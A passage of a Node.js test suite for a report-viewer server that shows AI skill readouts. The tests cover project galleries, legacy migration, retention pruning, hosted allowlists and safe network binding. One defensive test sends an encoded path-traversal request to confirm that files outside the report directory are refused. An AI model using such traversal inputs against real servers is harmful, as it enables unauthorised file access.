      generatedAt: "2026-07-25T15:30:00.000Z",
      outcome,
    }, { directory, cwd, layout: "project" }));
  }

  assert.notEqual(reports[0].path, reports[1].path);

  for (const report of reports) {
    assert.match(
      relative(directory, report.path),
      /^github\.com\/quickstark\/skills\/2026\/07\/qs-plan-research--2026-07-25T15-30-00-000Z--[a-f0-9]{8}\.html$/,
    );
  }

  let viewer = await startReadoutServer({ directory, port: 0 });

  context.after(async () => {
    if (!viewer.server.listening) return;

    await new Promise((done, fail) => {
      viewer.server.close((error) => error ? fail(error) : done());
    });
  });

  for (const report of reports) {
    const response = await fetch(new URL(report.relativePath, viewer.url));

    assert.equal(response.status, 200);
    assert.match(await response.text(), /durable project decision/);
  }

  await new Promise((done, fail) => {
    viewer.server.close((error) => error ? fail(error) : done());
  });

  viewer = await startReadoutServer({ directory, port: 0 });

  for (const report of reports) {
    const response = await fetch(new URL(report.relativePath, viewer.url));

    assert.equal(response.status, 200);
    assert.match(await response.text(), /durable project decision/);
  }

  const health = await fetch(new URL("__quickstark_health", viewer.url));

  assert.equal(health.status, 200);
  assert.equal((await health.json()).directory, readoutDirectoryIdentity(directory));
});

test("the production gallery groups actual reports into a project-first library", async (context) => {
  const { viewer, reports } = await temporaryProjectGallery(context);
  const response = await fetch(viewer.url);

  assert.equal(response.status, 200);

  const html = await response.text();

  assert.match(html, /Project library/);
  assert.match(html, /quickstark\/skills/);
  assert.match(html, /quickstark\/marketplace/);
  assert.match(html, /CURRENT PROJECT/i);
  assert.match(html, /Research the skill-hosting architecture/);
  assert.match(html, /Build the marketplace search experience/);
  assert.match(html, /Research brief/);
  assert.match(html, /Delivery summary/);
  assert.doesNotMatch(html, /Catalog preview only; no actual design work occurred/);
  assert.ok(html.indexOf("quickstark/marketplace") < html.indexOf("quickstark/skills"));

  for (const report of reports.slice(0, 2)) {
    assert.ok(html.includes(report.relativePath), `Gallery must link the actual ${report.filename}.`);
  }
});

test("the production viewer safely serves purpose-specific concept maps and labels", async (context) => {
  const { directory, viewer } = await temporaryProjectGallery(context);
  const domain = await writeSkillReadout({
    skill: "qs-design-domain",
    outcome: "Defined the skill-report profile and truthful visual-cue vocabulary.",
    projectIdentity: explicitProject("skills"),
    findings: [
      { title: "Report profile", detail: "A purpose-specific presentation of actual results." },
      { title: "Visual cue", detail: "An accessible display of recorded observations." },
    ],
    decisions: [
      { title: "Catalog previews are not actual runs", detail: "No visualization may claim invented results." },
    ],
  }, { directory, layout: "project" });

  const response = await fetch(new URL(domain.relativePath, viewer.url));

  assert.equal(response.status, 200);
  assert.match(response.headers.get("content-security-policy"), /default-src 'none'/);

  const html = await response.text();

  assert.match(html, /Domain model/);
  assert.match(html, /Shared vocabulary/);
  assert.match(html, /<svg\b[^>]*role="img"/);
  assert.match(html, /Report profile/);
  assert.doesNotMatch(html, /<script\b/i);

  const gallery = await fetch(viewer.url);

  assert.match(await gallery.text(), /Domain model/);
});

test("the gallery truthfully labels earlier reports without changing immutable legacy HTML", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const filename = "qs-plan-research--2026-07-23T09-00-00-000Z--abcdef12.html";
  const original = renderSkillReadout({
    skill: "qs-plan-research",
    generatedAt: "2026-07-23T09:00:00.000Z",
    outcome: "Preserve the original report and identify its actual research skill.",
  }).replace(/\s*<meta name="quickstark:report-profile" content="[^"]*">/, "");

  await writeFile(join(directory, filename), original, "utf8");

  const viewer = await startReadoutServer({ directory, port: 0 });

  context.after(async () => {
    await new Promise((done, fail) => {
      viewer.server.close((error) => error ? fail(error) : done());
    });
  });

  const response = await fetch(viewer.url);
  const html = await response.text();

  assert.equal(response.status, 200);
  assert.match(html, /Research brief/);
  assert.ok(html.includes(filename));
  assert.equal(await readFile(join(directory, filename), "utf8"), original);

  const direct = await fetch(new URL(filename, viewer.url));

  assert.equal(direct.status, 200);
  assert.doesNotMatch(await direct.text(), /quickstark:report-profile/);
});

test("retired explorer URLs preserve searchable project-first Workbench state without restoring the old menu", async (context) => {
  const { viewer, reports } = await temporaryProjectGallery(context);
  const parameters = new URLSearchParams({
    view: "explorer",
    project: "github.com/quickstark/skills",
    q: "hosting",
  });
  const response = await fetch(new URL(`?${parameters}`, viewer.url));

  assert.equal(response.status, 200);

  const html = await response.text();
  const selectedProject = html.match(
    /<article\b[^>]*data-project="github\.com\/quickstark\/skills"[^>]*>([\s\S]*?)<\/article>/,
  );
  const selectedReadout = html.match(
    /<aside\b[^>]*aria-label="Selected skill readout"[^>]*>([\s\S]*?)<\/aside>/,
  );

  assert.match(html, /Project Workbench/);
  assert.match(html, /quickstark\/skills/);
  assert.match(html, /quickstark\/marketplace/);
  assert.match(html, /Research the skill-hosting architecture/);
  assert.ok(selectedProject, "the requested verified project remains directly selected");
  assert.ok(selectedReadout, "the requested project retains one integrated immutable reading pane");
  assert.ok(selectedProject[1].includes(reports[0].relativePath));
  assert.doesNotMatch(selectedProject[1], /Build the marketplace search experience/);
  assert.doesNotMatch(selectedReadout[1], /Build the marketplace search experience/);
  assert.ok(!selectedProject[1].includes(reports[1].relativePath));
  assert.doesNotMatch(html, /aria-label="Readout views"|\bname="view"/);
  assert.doesNotMatch(html, /href="[^"<>]*\bview=(?:explorer|activity)\b/);
  assert.match(response.headers.get("content-security-policy"), /form-action 'self'/);

  const empty = await fetch(new URL(`?${new URLSearchParams({
    view: "explorer",
    project: "github.com/quickstark/skills",
    q: "this outcome does not exist",
  })}`, viewer.url));

  assert.match(await empty.text(), /No actual skill readouts match this project search/);
});

test("retired activity URLs preserve the single project-first Workbench and safe preview state", async (context) => {
  const { viewer, reports } = await temporaryProjectGallery(context);
  const response = await fetch(new URL("?view=activity", viewer.url));

  assert.equal(response.status, 200);

  const html = await response.text();

  assert.match(html, /Project Workbench/);
  assert.match(html, /quickstark\/marketplace/);
  assert.match(html, /quickstark\/skills/);
  assert.match(html, /Build the marketplace search experience/);
  assert.match(html, /Research the skill-hosting architecture/);
  assert.ok(html.indexOf("Build the marketplace search experience")
    < html.indexOf("Research the skill-hosting architecture"));
  assert.doesNotMatch(html, /Catalog preview only; no actual design work occurred/);
  assert.doesNotMatch(html, /aria-label="Readout views"|\bname="view"/);
  assert.doesNotMatch(html, /href="[^"<>]*\bview=(?:explorer|activity)\b/);

  for (const report of reports.slice(0, 2)) {
    assert.ok(html.includes(report.relativePath));
  }

  const previews = await fetch(new URL("?view=activity&previews=1", viewer.url));
  const previewHtml = await previews.text();

  assert.match(previewHtml, /Catalog preview only; no actual design work occurred/);
  assert.match(previewHtml, />Preview</);
  assert.ok(previewHtml.includes(reports[2].relativePath));
  assert.match(previewHtml, /Hide catalog previews/);
});

test("legacy readouts remain accessible and are honestly marked as unassigned", async (context) => {
  const { directory, viewer, reports } = await temporaryProjectGallery(context);
  const filename = "qs-plan-research--2026-07-23T09-00-00-000Z--abcdef12.html";
  const legacy = renderSkillReadout({
    skill: "qs-plan-research",
    project: "An unverified personal project heading",
    generatedAt: "2026-07-23T09:00:00.000Z",
    outcome: "A previously generated flat readout remains available.",
  });

  await writeFile(join(directory, filename), legacy, "utf8");

  const index = await fetch(viewer.url);
  const html = await index.text();

  assert.match(html, /Unassigned legacy reports/);
  assert.match(html, /Project identity not verified/);
  assert.match(html, /previously generated flat readout remains available/);
  assert.doesNotMatch(html, /An unverified personal project heading/);
  assert.ok(html.includes(filename));
  assert.ok(html.includes(reports[0].relativePath));

  const direct = await fetch(new URL(filename, viewer.url));

  assert.equal(direct.status, 200);
  assert.match(await direct.text(), /An unverified personal project heading/);
});

test("legacy migration is explicit, dry-run first, immutable, and safe to repeat", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const filename = "qs-plan-research--2026-07-23T09-00-00-000Z--abcdef12.html";
  const originalPath = join(directory, filename);
  const original = renderSkillReadout({
    skill: "qs-plan-research",
    project: "An unverified personal project heading",
    generatedAt: "2026-07-23T09:00:00.000Z",
    outcome: "Migrate this historical report only when explicitly approved.",
  });

  await writeFile(originalPath, original, "utf8");

  await assert.rejects(migrateLegacyReadouts({ directory }), /explicit target project/i);

  const preview = await migrateLegacyReadouts({
    directory,
    project: explicitProject("skills"),
  });

  assert.equal(preview.dryRun, true);
  assert.equal(preview.migrated, 0);
  assert.equal(preview.candidates, 1);
  assert.equal(await readFile(originalPath, "utf8"), original);
  assert.equal(await exists(preview.reports[0].target), false);

  const applied = await migrateLegacyReadouts({
    directory,
    project: explicitProject("skills"),
    apply: true,
  });

  assert.equal(applied.dryRun, false);
  assert.equal(applied.migrated, 1);
  assert.equal(await readFile(originalPath, "utf8"), original);

  const migrated = await readFile(applied.reports[0].target, "utf8");

  assert.match(migrated, /<meta name="quickstark:project" content="github\.com\/quickstark\/skills">/);
  assert.match(migrated, /<meta name="quickstark:project-source" content="explicit">/);
  assert.match(migrated, /Migrate this historical report only when explicitly approved/);

  const repeated = await migrateLegacyReadouts({
    directory,
    project: explicitProject("skills"),
    apply: true,
  });

  assert.equal(repeated.migrated, 0);
  assert.equal(repeated.skipped, 1);
  assert.equal(await readFile(originalPath, "utf8"), original);
});

test("explicit legacy migration can preserve temporary originals in a durable report library", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const targetDirectory = await temporaryReadoutDirectory(context);
  const filename = "qs-plan-research--2026-07-23T09-00-00-000Z--abcdef12.html";
  const originalPath = join(directory, filename);
  const original = renderSkillReadout({
    skill: "qs-plan-research",
    generatedAt: "2026-07-23T09:00:00.000Z",
    outcome: "Preserve this explicitly verified temporary report in durable storage.",
  });

  await writeFile(originalPath, original, "utf8");

  const preview = await migrateLegacyReadouts({
    directory,
    targetDirectory,
    project: "github.com/quickstark/skills",
  });

  assert.equal(preview.dryRun, true);
  assert.ok(preview.reports[0].target.startsWith(`${targetDirectory}/`));
  assert.equal(await exists(preview.reports[0].target), false);

  const applied = await migrateLegacyReadouts({
    directory,
    targetDirectory,
    project: "github.com/quickstark/skills",
    apply: true,
  });

  assert.equal(applied.migrated, 1);
  assert.ok(applied.reports[0].target.startsWith(`${targetDirectory}/`));
  assert.equal(await readFile(originalPath, "utf8"), original);
  assert.match(await readFile(applied.reports[0].target, "utf8"), /quickstark:project/);
});

test("hosted publication fails closed and isolates all views and direct report links", async (context) => {
  await assert.rejects(
    startReadoutServer({
      directory: await temporaryReadoutDirectory(context),
      port: 0,
      publicationMode: "hosted",
    }),
    /explicitly approved project/i,
  );

  const { viewer, reports } = await temporaryProjectGallery(context, {
    publicationMode: "hosted",
    allowedProjects: ["github.com/quickstark/skills"],
  });

  for (const route of ["./", "?view=explorer", "?view=activity"]) {
    const response = await fetch(new URL(route, viewer.url));
    const html = await response.text();

    assert.equal(response.status, 200);
    assert.match(html, /quickstark\/skills/);
    assert.doesNotMatch(html, /marketplace/i);
    assert.doesNotMatch(html, /Build the marketplace search experience/);
  }

  const approved = await fetch(new URL(reports[0].relativePath, viewer.url));
  const denied = await fetch(new URL(reports[1].relativePath, viewer.url));

  assert.equal(approved.status, 200);
  assert.equal(denied.status, 404);
  assert.doesNotMatch(await denied.text(), /marketplace/i);

  const guessedProject = await fetch(new URL(`?${new URLSearchParams({
    view: "explorer",
    project: "github.com/quickstark/marketplace",
    q: "marketplace",
  })}`, viewer.url));

  assert.doesNotMatch(await guessedProject.text(), /marketplace/i);
});

test("report retention previews deletion and cannot delete another project's history", async (context) => {
  const { directory, reports } = await temporaryProjectGallery(context);

  await assert.rejects(pruneReadouts({ directory, retentionDays: 1 }), /explicit target project/i);

  const preview = await pruneReadouts({
    directory,
    project: "github.com/quickstark/skills",
    retentionDays: 1,
    now: "2026-08-01T00:00:00.000Z",
  });

  assert.equal(preview.dryRun, true);
  assert.equal(preview.candidates, 2);
  assert.equal(preview.deleted, 0);
  assert.equal(await exists(reports[0].path), true);
  assert.equal(await exists(reports[1].path), true);

  const applied = await pruneReadouts({
    directory,
    project: "github.com/quickstark/skills",
    retentionDays: 1,
    now: "2026-08-01T00:00:00.000Z",
    apply: true,
  });

  assert.equal(applied.deleted, 2);
  assert.equal(await exists(reports[0].path), false);
  assert.equal(await exists(reports[2].path), false);
  assert.equal(await exists(reports[1].path), true);
});

test("migration and retention commands default to reviewable, non-mutating JSON previews", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const filename = "qs-plan-research--2026-07-23T09-00-00-000Z--abcdef12.html";
  const originalPath = join(directory, filename);

  await writeFile(originalPath, renderSkillReadout({
    skill: "qs-plan-research",
    generatedAt: "2026-07-23T09:00:00.000Z",
    outcome: "Inspect the legacy migration before applying it.",
  }), "utf8");

  const script = join(repositoryRoot, "scripts", "qs-skill-readout.mjs");
  const { stdout } = await execFileAsync(process.execPath, [
    script,
    "migrate",
    "--directory", directory,
    "--project", "github.com/quickstark/skills",
    "--json",
  ]);
  const migration = JSON.parse(stdout);

  assert.equal(migration.dryRun, true);
  assert.equal(migration.candidates, 1);
  assert.equal(await exists(originalPath), true);
  assert.equal(await exists(migration.reports[0].target), false);

  const retention = await execFileAsync(process.execPath, [
    script,
    "prune",
    "--directory", directory,
    "--project", "github.com/quickstark/skills",
    "--retention-days", "30",
    "--json",
  ]);

  assert.equal(JSON.parse(retention.stdout).dryRun, true);
  assert.equal(await exists(originalPath), true);
});

test("trusted reverse-proxy mode is available only for an explicitly allowlisted hosted library", async (context) => {
  const directory = await temporaryReadoutDirectory(context);

  await assert.rejects(
    startReadoutServer({ directory, port: 0, trustedProxy: true }),
    /trusted reverse proxy requires hosted publication/i,
  );

  await assert.rejects(
    startReadoutServer({
      directory,
      port: 0,
      publicationMode: "hosted",
      trustedProxy: true,
    }),
    /explicitly approved project/i,
  );

  const { viewer, reports } = await temporaryProjectGallery(context, {
    publicationMode: "hosted",
    allowedProjects: ["github.com/quickstark/skills"],
    trustedProxy: true,
  });

  assert.equal(viewer.accessToken, null);
  assert.equal(viewer.publicationMode, "hosted");
  assert.equal((await fetch(viewer.url)).status, 200);
  assert.equal((await fetch(new URL(reports[1].relativePath, viewer.url))).status, 404);
});

test("a hosted container can explicitly and safely identify its verified current project", async (context) => {
  const { viewer } = await temporaryProjectGallery(context, {
    publicationMode: "hosted",
    allowedProjects: ["github.com/quickstark/skills", "github.com/quickstark/marketplace"],
    currentProject: "github.com/quickstark/marketplace",
  });
  const response = await fetch(viewer.url);
  const html = await response.text();

  assert.match(
    html,
    /<article class="project-card current" data-project="github\.com\/quickstark\/marketplace">/,
  );
  assert.doesNotMatch(
    html,
    /<article class="project-card current" data-project="github\.com\/quickstark\/skills">/,
  );

  await assert.rejects(
    startReadoutServer({
      directory: await temporaryReadoutDirectory(context),
      port: 0,
      publicationMode: "hosted",
      allowedProjects: ["github.com/quickstark/skills"],
      currentProject: "github.com/quickstark/marketplace",
    }),
    /current project must be explicitly approved/i,
  );
});

test("the hosted deployment attaches Authelia and exposes no direct container or repository port", async () => {
  const compose = await readFile(join(repositoryRoot, "deploy", "readouts", "compose.yaml"), "utf8");

  assert.match(compose, /reports\.quickstark\.com/);
  assert.match(compose, /traefik\.http\.routers\.quickstark-readouts\.middlewares=authelia@file/);
  assert.match(compose, /traefik\.http\.services\.quickstark-readouts\.loadbalancer\.server\.port=4173/);
  assert.match(compose, /QS_READOUT_PUBLICATION_MODE:\s*hosted/);
  assert.match(
    compose,
    /QS_READOUT_ALLOWED_PROJECTS:\s*["']\*["']/,
  );
  assert.match(compose, /QS_READOUT_CURRENT_PROJECT:\s*github\.com\/quickstark\/skills/);
  assert.match(compose, /QS_READOUT_TRUSTED_PROXY:\s*["']?true/);
  assert.match(compose, /working_dir:\s*\/opt\/quickstark/);
  assert.match(compose, /\/github\/skills:\/opt\/quickstark:ro/);
  assert.match(compose, /QS_READOUT_DIR:\s*\/docker\/appdata\/quickstark-readouts/);
  assert.match(compose, /\/docker\/appdata\/quickstark-readouts:\/docker\/appdata\/quickstark-readouts:ro/);
  assert.match(compose, /read_only:\s*true/);
  assert.doesNotMatch(compose, /^\s*ports:/m);
  assert.doesNotMatch(compose, /0\.0\.0\.0/);
});

test("the preview gallery covers all 24 skills without inventing completed work", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const previews = await writeSkillGallery({ directory });

  assert.equal(previews.length, SKILLS.length);
  assert.deepEqual(
    previews.map((preview) => preview.skill).sort(),
    SKILLS.map((skill) => skill.name).sort(),
  );

  for (const preview of previews) {
    const html = await readFile(preview.path, "utf8");

    assert.equal(preview.status, "Preview");
    assert.match(html, /Catalog preview only/);
    assert.match(html, /No skill has been run/);
    assert.doesNotMatch(html, /class="skills-used"/);

    const body = html.slice(html.indexOf("<body"));

    assert.match(body, /Catalog information/, `${preview.skill} must label its catalog-only descriptions.`);
    assert.doesNotMatch(body, /class="metrics"/, `${preview.skill} must not count catalog copy as work.`);
    assert.doesNotMatch(body, /class="signal-panel"/, `${preview.skill} must not visualize unobserved work.`);
    assert.doesNotMatch(body, /class="[^"]*\bcheck-passed\b/, `${preview.skill} must not invent passing checks.`);
  }
});

test("home-network discovery chooses physical private interfaces over Docker and Tailscale", () => {
  const interfaces = {
    docker0: [{ address: "172.17.0.1", family: "IPv4", internal: false }],
    tailscale0: [{ address: "100.66.93.87", family: "IPv4", internal: false }],
    wlp3s0: [{ address: "192.168.1.28", family: "IPv4", internal: false }],
    enp1s0: [{ address: "192.168.1.200", family: "IPv4", internal: false }],
  };

  assert.equal(discoverHomeNetworkAddress(interfaces), "192.168.1.200");
});

test("automatic Mac readouts stay on localhost", () => {
  const host = resolveReadoutViewerHost({
    runtimePlatform: "darwin",
    environment: {},
    interfaces: {
      en0: [{ address: "192.168.1.42", family: "IPv4", internal: false }],
    },
  });

  assert.equal(host, DEFAULT_READOUT_HOST);
});

test("SSH-connected Linux readouts automatically select the private home-network IP", () => {
  const host = resolveReadoutViewerHost({
    runtimePlatform: "linux",
    environment: { SSH_CONNECTION: "private-ssh-session" },
    interfaces: {
      enp1s0: [{ address: "192.168.1.200", family: "IPv4", internal: false }],
      tailscale0: [{ address: "100.66.93.87", family: "IPv4", internal: false }],
    },
  });

  assert.equal(host, "192.168.1.200");
});

test("SSH-only and local-only access explicitly remain on loopback", () => {
  const options = {
    runtimePlatform: "linux",
    environment: { SSH_CONNECTION: "private-ssh-session" },
    interfaces: {
      enp1s0: [{ address: "192.168.1.200", family: "IPv4", internal: false }],
    },
  };

  assert.equal(resolveReadoutViewerHost({ ...options, access: "ssh" }), DEFAULT_READOUT_HOST);
  assert.equal(resolveReadoutViewerHost({ ...options, access: "local" }), DEFAULT_READOUT_HOST);
  assert.equal(resolveReadoutViewerHost({ ...options, access: "lan" }), "192.168.1.200");
});

test("readout discovery refuses an unavailable private LAN instead of inventing a URL", () => {
  assert.throws(
    () => resolveReadoutViewerHost({
      access: "lan",
      interfaces: {
        tailscale0: [{ address: "100.66.93.87", family: "IPv4", internal: false }],
        docker0: [{ address: "172.17.0.1", family: "IPv4", internal: false }],
      },
    }),
    /No trusted private home-network address/,
  );
});

test("the readout viewer defaults to private loopback and serves the skill gallery", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const report = await writeSkillReadout({
    skill: "qs-help",
    outcome: "Selected the right engineering workflow.",
  }, { directory });
  const viewer = await startReadoutServer({ directory, port: 0 });

  context.after(async () => {
    await new Promise((done, fail) => {
      viewer.server.close((error) => error ? fail(error) : done());
    });
  });

  assert.equal(viewer.host, DEFAULT_READOUT_HOST);
  assert.match(viewer.url, /^http:\/\/127\.0\.0\.1:\d+\/$/);

  const dashboard = await fetch(viewer.url);
  assert.equal(dashboard.status, 200);
  assert.match(await dashboard.text(), /QS Help/);
  assert.match(dashboard.headers.get("content-security-policy"), /default-src 'none'/);

  const page = await fetch(new URL(report.filename, viewer.url));
  assert.equal(page.status, 200);
  assert.match(await page.text(), /Selected the right engineering workflow/);
});

test("the viewer rejects repository files, encoded traversal, and unexpected HTTP methods", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const viewer = await startReadoutServer({ directory, port: 0 });

  context.after(async () => {
    await new Promise((done, fail) => {
      viewer.server.close((error) => error ? fail(error) : done());
    });
  });

  const repositoryFile = await fetch(new URL("package.json", viewer.url));
  assert.equal(repositoryFile.status, 404);

  const traversal = await fetch(new URL("/%2e%2e%2fpackage.json", viewer.url));
  assert.equal(traversal.status, 404);

  const unexpectedMethod = await fetch(viewer.url, { method: "POST" });
  assert.equal(unexpectedMethod.status, 405);
  assert.equal(unexpectedMethod.headers.get("allow"), "GET, HEAD");
});

test("network-accessible viewers require an unguessable capability URL", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const accessToken = "a".repeat(48);
  const report = await writeSkillReadout({
    skill: "qs-help",
    outcome: "Selected the right engineering workflow.",
  }, { directory });
  const viewer = await startReadoutServer({
    directory,
    host: DEFAULT_READOUT_HOST,
    port: 0,
    accessToken,
  });

  context.after(async () => {
    await new Promise((done, fail) => {
      viewer.server.close((error) => error ? fail(error) : done());
    });
  });

  assert.match(viewer.url, new RegExp(`/r/${accessToken}/$`));

  const unprotectedRoot = await fetch(`http://127.0.0.1:${viewer.port}/`);
  assert.equal(unprotectedRoot.status, 404);

  const guessedRoot = await fetch(
    `http://127.0.0.1:${viewer.port}/r/${"b".repeat(48)}/`,
  );
  assert.equal(guessedRoot.status, 404);

  const dashboard = await fetch(viewer.url);
  assert.equal(dashboard.status, 200);
  assert.match(await dashboard.text(), /QS Help/);

  const reportPage = await fetch(new URL(report.filename, viewer.url));
  assert.equal(reportPage.status, 200);
  assert.match(await reportPage.text(), /Selected the right engineering workflow/);
});

test("automatic viewer startup verifies and reuses an existing QuickStark service", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const viewer = await startReadoutServer({ directory, port: 0 });

  context.after(async () => {
    await new Promise((done, fail) => {
      viewer.server.close((error) => error ? fail(error) : done());
    });
  });

  const reused = await ensureReadoutViewer({
    directory,
    baseUrl: viewer.url,
  });

  assert.equal(reused.url, viewer.url);
  assert.equal(reused.reused, true);

  const health = await fetch(new URL("__quickstark_health", reused.url));
  assert.equal(health.status, 200);
  assert.deepEqual(await health.json(), {
    service: "quickstark-skill-readouts",
    version: 1,
    directory: readoutDirectoryIdentity(directory),
  });
});

test("automatic readouts refuse a healthy viewer serving another report directory", async (context) => {
  const viewerDirectory = await temporaryReadoutDirectory(context);
  const requestedDirectory = await temporaryReadoutDirectory(context);
  const viewer = await startReadoutServer({ directory: viewerDirectory, port: 0 });

  context.after(async () => {
    await new Promise((done, fail) => {
      viewer.server.close((error) => error ? fail(error) : done());
    });
  });

  await assert.rejects(
    ensureReadoutViewer({
      directory: requestedDirectory,
      baseUrl: viewer.url,
    }),
    /serves a different report directory/,
  );
});

test("a readout starts its local background viewer once and reuses it", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const portProbe = await startReadoutServer({ directory, port: 0 });
  const port = portProbe.port;

  await new Promise((done, fail) => {
    portProbe.server.close((error) => error ? fail(error) : done());
  });

  const first = await ensureReadoutViewer({
    directory,
    host: DEFAULT_READOUT_HOST,
    port,
  });

  context.after(() => {
    try {
      process.kill(first.pid, "SIGTERM");
    } catch (error) {
      if (error.code !== "ESRCH") throw error;
    }
  });

  assert.equal(first.reused, false);
  assert.ok(Number.isInteger(first.pid));

  const second = await ensureReadoutViewer({
    directory,
    host: DEFAULT_READOUT_HOST,
    port,
  });

  assert.equal(second.reused, true);
  assert.equal(second.pid, first.pid);
  assert.equal(second.url, first.url);

  const statePath = join(directory, READOUT_VIEWER_STATE);
  const state = JSON.parse(await readFile(statePath, "utf8"));

  assert.equal(state.url, first.url);
  assert.equal(state.pid, first.pid);
  assert.equal((await stat(statePath)).mode & 0o777, 0o600);
});

test("automatic readouts select another port when a development server already occupies the default", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const blocker = createPortBlocker();

  await new Promise((done, fail) => {
    blocker.once("error", fail);
    blocker.listen(0, DEFAULT_READOUT_HOST, done);
  });

  context.after(async () => {
    await new Promise((done, fail) => {
      blocker.close((error) => error ? fail(error) : done());
    });
  });

  const blockedPort = blocker.address().port;
  const viewer = await ensureReadoutViewer({
    directory,
    host: DEFAULT_READOUT_HOST,
    defaultPort: blockedPort,
  });

  context.after(() => {
    try {
      process.kill(viewer.pid, "SIGTERM");
    } catch (error) {
      if (error.code !== "ESRCH") throw error;
    }
  });

  assert.notEqual(viewer.port, blockedPort);
  assert.ok(viewer.port > blockedPort);

  const health = await fetch(new URL("__quickstark_health", viewer.url));
  assert.equal(health.status, 200);

  const reused = await ensureReadoutViewer({
    directory,
    host: DEFAULT_READOUT_HOST,
    defaultPort: blockedPort,
  });

  assert.equal(reused.reused, true);
  assert.equal(reused.port, viewer.port);
});

test("explicitly requested readout ports fail clearly when already occupied", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const blocker = createPortBlocker();

  await new Promise((done, fail) => {
    blocker.once("error", fail);
    blocker.listen(0, DEFAULT_READOUT_HOST, done);
  });

  context.after(async () => {
    await new Promise((done, fail) => {
      blocker.close((error) => error ? fail(error) : done());
    });
  });

  await assert.rejects(
    ensureReadoutViewer({
      directory,
      host: DEFAULT_READOUT_HOST,
      port: blocker.address().port,
    }),
    /explicitly requested readout port .* is already in use/,
  );
});

test("the skill-facing renderer automatically returns a verified, reusable report URL", async (context) => {
  const directory = await temporaryReadoutDirectory(context);
  const portProbe = await startReadoutServer({ directory, port: 0 });
  const port = portProbe.port;

  await new Promise((done, fail) => {
    portProbe.server.close((error) => error ? fail(error) : done());
  });

  const command = [
    join(repositoryRoot, "scripts", "qs-skill-readout.mjs"),
    "render",
    "--data", JSON.stringify({
      skill: "qs-help",
      outcome: "Verified automatic report delivery for the actual skill-facing command.",
    }),
    "--directory", directory,
    "--access", "local",
    "--port", String(port),
    "--json",
  ];

  const first = JSON.parse((await execFileAsync(process.execPath, command, {
    timeout: 10_000,
    windowsHide: true,
  })).stdout);

  const state = JSON.parse(await readFile(join(directory, READOUT_VIEWER_STATE), "utf8"));

  context.after(() => {
    try {
      process.kill(state.pid, "SIGTERM");
    } catch (error) {
      if (error.code !== "ESRCH") throw error;
    }
  });

  assert.equal(first.viewerReused, false);
  assert.match(first.url, new RegExp(`^http://127\\.0\\.0\\.1:${port}/`));

  const page = await fetch(first.url);
  assert.equal(page.status, 200);
  assert.match(await page.text(), /Verified automatic report delivery/);

  const second = JSON.parse((await execFileAsync(process.execPath, command, {
    timeout: 10_000,
    windowsHide: true,
  })).stdout);

  assert.equal(second.viewerReused, true);
  assert.equal(new URL(second.url).origin, new URL(first.url).origin);
});

test("the viewer never binds to every network interface", async () => {
  await assert.rejects(
    startReadoutServer({ host: "0.0.0.0" }),
    /specific trusted home-network address/,
  );

  await assert.rejects(
    startReadoutServer({ host: "::" }),
    /specific trusted home-network address/,
  );
});

for (const skill of SKILLS) {
  test(`${skill.name} has matching folder, frontmatter, picker metadata, and documentation`, async () => {
    const directory = join(repositoryRoot, "skills", skill.bucket, skill.name);
    const skillContent = await readFile(join(directory, "SKILL.md"), "utf8");
    const metadata = await readFile(join(directory, "agents", "openai.yaml"), "utf8");

    assert.match(skillContent, new RegExp(`^name:\\s*${skill.name}\\s*$`, "m"));
    assert.match(skillContent, /^description:\s*\S/m);
    assert.match(metadata, new RegExp(`display_name:\\s*${JSON.stringify(skill.displayName)}`));
    assert.match(metadata, new RegExp(`default_prompt:\\s*"Use \\$${skill.name} to `));
    assert.ok(skill.shortDescription.length >= 25 && skill.shortDescription.length <= 64);
    assert.match(metadata, new RegExp(`short_description:\\s*${JSON.stringify(skill.shortDescription)}`));

    if (skill.userInvoked) {
      assert.match(skillContent, /^disable-model-invocation:\s*true\s*$/m);
      assert.match(metadata, /^\s*allow_implicit_invocation:\s*false\s*$/m);
    } else {
      assert.doesNotMatch(skillContent, /^disable-model-invocation:\s*true\s*$/m);
      assert.doesNotMatch(metadata, /^\s*allow_implicit_invocation:\s*false\s*$/m);
    }

    const documentation = await readFile(
      join(repositoryRoot, "docs", skill.bucket, `${skill.name}.md`),
      "utf8",
    );
    assert.match(documentation, /## What it does/);
    assert.match(documentation, /## When to reach for it/);
    assert.match(documentation, /## Where it fits/);
    assert.match(documentation, new RegExp(`\\/${skill.name}(?![a-z0-9-])`));

    assert.equal(
      skillContent.split(SKILL_OUTPUT_HEADING).length - 1,
      1,
      `${skill.name} must contain exactly one completion-report contract`,
    );
    assert.ok(
      skillContent.endsWith(renderSkillOutputContract(skill)),
      `${skill.name} has an outdated completion-report contract`,
    );
    assert.equal(
      documentation.split(DOCUMENTATION_OUTPUT_HEADING).length - 1,
      1,
      `${skill.name} must document its output and next steps exactly once`,
    );
    assert.ok(
      documentation.includes(renderDocumentationOutputContract(skill)),
      `${skill.name} has outdated output documentation`,
    );

    for (const next of NEXT_SKILLS_BY_NAME[skill.name]) {
      assert.ok(skillContent.includes(`/${next.name}`));
      assert.ok(documentation.includes(`/${next.name}`));
    }
  });
}

test("the root README links the authoritative project architecture, report operations, and contributor guides", async () => {
  const readme = await readFile(join(repositoryRoot, "README.md"), "utf8");

  for (const guide of [
    "./docs/architecture.md",
    "./docs/readout-operations.md",
    "./docs/contributing.md",
    "./CHANGELOG.md",
  ]) {
    assert.ok(readme.includes(guide), `root README omits ${guide}`);
    assert.equal(await exists(join(repositoryRoot, guide)), true, `${guide} does not exist`);
  }
});

test("project guides document actual skill sources, secure readout boundaries, and contributor checks", async () => {
  const [architecture, operations, contributing] = await Promise.all([
    readFile(join(repositoryRoot, "docs", "architecture.md"), "utf8"),
    readFile(join(repositoryRoot, "docs", "readout-operations.md"), "utf8"),
    readFile(join(repositoryRoot, "docs", "contributing.md"), "utf8"),
  ]);

  assert.match(architecture, /scripts\/qs-skill-catalog\.mjs/);
  assert.match(architecture, /scripts\/qs-skill-readout\.mjs/);
